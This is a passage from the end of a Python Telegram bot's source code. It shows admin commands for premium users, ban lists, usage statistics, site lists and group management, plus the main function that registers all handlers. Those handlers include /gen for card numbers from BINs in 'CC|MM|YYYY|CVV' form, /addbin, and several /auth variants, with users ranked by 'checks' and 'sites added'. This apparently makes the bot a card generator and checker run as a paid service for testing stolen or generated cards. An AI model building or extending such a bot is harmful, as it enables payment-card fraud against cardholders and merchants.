        await update.message.reply_text("❌ Invalid user ID")


async def premiumusers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /premiumusers command (admin only)"""
    user = update.effective_user
    user_id = user.id
    
    if not is_admin(user_id):
        return
    
    users = load_json(USERS_FILE)
    premium_users = []
    
    for uid, user_data in users.items():
        if is_premium(int(uid)):
            premium_users.append(f"@{user_data.get('username', 'N/A')} ({uid})")
    
    if not premium_users:
        await update.message.reply_text("No premium users")
        return
    
    text = '\n'.join(premium_users)
    if len(text) > 4000:
        user_folder = get_user_folder(user_id)
        file_path = user_folder / "premium_users.txt"
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(text)
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=open(file_path, 'rb'),
            filename="premium_users.txt"
        )
    else:
        await update.message.reply_text(f"Premium Users:\n\n{text}")


async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /users command (admin only)"""
    user = update.effective_user
    user_id = user.id
    
    if not is_admin(user_id):
        return
    
    users = load_json(USERS_FILE)
    total_users = len(users)
    active_users = sum(1 for u in users.values() 
                      if datetime.fromisoformat(u.get('last_active', '2000-01-01')) > datetime.now() - timedelta(hours=48))
    
    # Top 3 by checks
    top_checks = sorted(users.values(), key=lambda x: x.get('total_checks', 0), reverse=True)[:3]
    # Top 3 by sites
    top_sites = sorted(users.values(), key=lambda x: x.get('total_sites', 0), reverse=True)[:3]
    
    text = f"📊 Statistics:\n"
    text += f"• Total Users: {total_users}\n"
    text += f"• Active Users (48h): {active_users}\n\n"
    text += f"🏆 Top 3 by Checks:\n"
    for i, u in enumerate(top_checks, 1):
        text += f"{i}. @{u.get('username', 'N/A')} - {u.get('total_checks', 0)} checks\n"
    text += f"\n🏆 Top 3 by Sites Added:\n"
    for i, u in enumerate(top_sites, 1):
        text += f"{i}. @{u.get('username', 'N/A')} - {u.get('total_sites', 0)} sites\n"
    
    await update.message.reply_text(text)


async def tsites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /tsites command (admin only)"""
    user = update.effective_user
    user_id = user.id
    
    if not is_admin(user_id):
        return
    
    sites = get_active_sites()
    await update.message.reply_text(f"Total active sites: {len(sites)}")


async def dsites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /dsites command (admin only)"""
    user = update.effective_user
    user_id = user.id
    
    if not is_admin(user_id):
        return
    
    sites = get_active_sites()
    if not sites:
        await update.message.reply_text("No active sites")
        return
    
    text = '\n'.join(sites)
    user_folder = get_user_folder(user_id)
    file_path = user_folder / "all_sites.txt"
    with open(file_path, 'w', encoding='utf-8') as f:
        f.write(text)
    
    await context.bot.send_document(
        chat_id=update.effective_chat.id,
        document=open(file_path, 'rb'),
        filename="all_sites.txt"
    )


async def addgrp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /addgrp command (admin only)"""
    user = update.effective_user
    user_id = user.id
    
    if not is_admin(user_id):
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /addgrp groupId")
        return
    
    try:
        group_id = int(context.args[0])
        groups_file = BASE_DIR / "groups.json"
        groups = load_json(groups_file)
        groups[str(group_id)] = {
            'added_at': datetime.now().isoformat(),
            'added_by': user_id
        }
        save_json(groups_file, groups)
        await update.message.reply_text(f"✅ Group {group_id} added")
    except ValueError:
        await update.message.reply_text("❌ Invalid group ID")


async def rmgrp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /rmgrp command (admin only)"""
    user = update.effective_user
    user_id = user.id
    
    if not is_admin(user_id):
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /rmgrp groupId")
        return
    
    try:
        group_id = int(context.args[0])
        groups_file = BASE_DIR / "groups.json"
        groups = load_json(groups_file)
        if str(group_id) in groups:
            del groups[str(group_id)]
            save_json(groups_file, groups)
            await update.message.reply_text(f"✅ Group {group_id} removed")
        else:
            await update.message.reply_text(f"❌ Group {group_id} not found")
    except ValueError:
        await update.message.reply_text("❌ Invalid group ID")


async def groups_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /groups command (admin only)"""
    user = update.effective_user
    user_id = user.id
    
    if not is_admin(user_id):
        return
    
    groups_file = BASE_DIR / "groups.json"
    groups = load_json(groups_file)
    
    if not groups:
        await update.message.reply_text("No groups added")
        return
    
    text_lines = []
    for group_id, data in groups.items():
        text_lines.append(f"Group ID: {group_id}")
    
    text = '\n'.join(text_lines)
    if len(text) > 4000:
        user_folder = get_user_folder(user_id)
        file_path = user_folder / "groups.txt"
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(text)
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=open(file_path, 'rb'),
            filename="groups.txt"
        )
    else:
        await update.message.reply_text(f"Groups:\n\n{text}")


# ==================== MAIN ====================

def main():
    """Start the bot"""
    # Create application with concurrent updates enabled
    # This allows multiple users to use the bot simultaneously
    # drop_pending_updates=True ignores messages received while bot was offline
    application = Application.builder().token(BOT_TOKEN).concurrent_updates(True).build()
    
    
    # Register handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("site", site_command))
    application.add_handler(CommandHandler("profile", profile))
    application.add_handler(CommandHandler("mysites", mysites))
    application.add_handler(CommandHandler("auth", auth_command))
    application.add_handler(CommandHandler("sauth", sauth_command))
    application.add_handler(CommandHandler("mauth", mauth_command))
    application.add_handler(CommandHandler("mcancel", mcancel_command))
    
    # Handle /gen, /gen100, /gen1000, etc.
    # CommandHandler only matches exact commands like "/gen", but not "/gen100"
    # So we use MessageHandler to catch all /gen variants
    # Match: /gen, /gen100, /gen1000, /gen BIN, /gen100 BIN, /gen CC|MM|YYYY|CVV, etc.
    gen_pattern = filters.Regex(r'^/gen\d*(\s.*)?$')
    application.add_handler(MessageHandler(filters.TEXT & gen_pattern, gen_command))
    application.add_handler(CommandHandler("msites", msites_command))
    
    # Admin commands
    application.add_handler(CommandHandler("addbin", addbin_command))
    application.add_handler(CommandHandler("premium", premium_command))
    application.add_handler(CommandHandler("ban", ban_command))
    application.add_handler(CommandHandler("unban", unban_command))
    application.add_handler(CommandHandler("premiumusers", premiumusers_command))
    application.add_handler(CommandHandler("users", users_command))
    application.add_handler(CommandHandler("tsites", tsites_command))
    application.add_handler(CommandHandler("dsites", dsites_command))
    application.add_handler(CommandHandler("addgrp", addgrp_command))
    application.add_handler(CommandHandler("rmgrp", rmgrp_command))
    application.add_handler(CommandHandler("groups", groups_command))
    
    # Start bot
    # drop_pending_updates=True ignores messages received while bot was offline
    print("Bot is starting...")
    print("⚠️  Dropping pending updates (ignoring messages received while bot was offline)")
    application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()

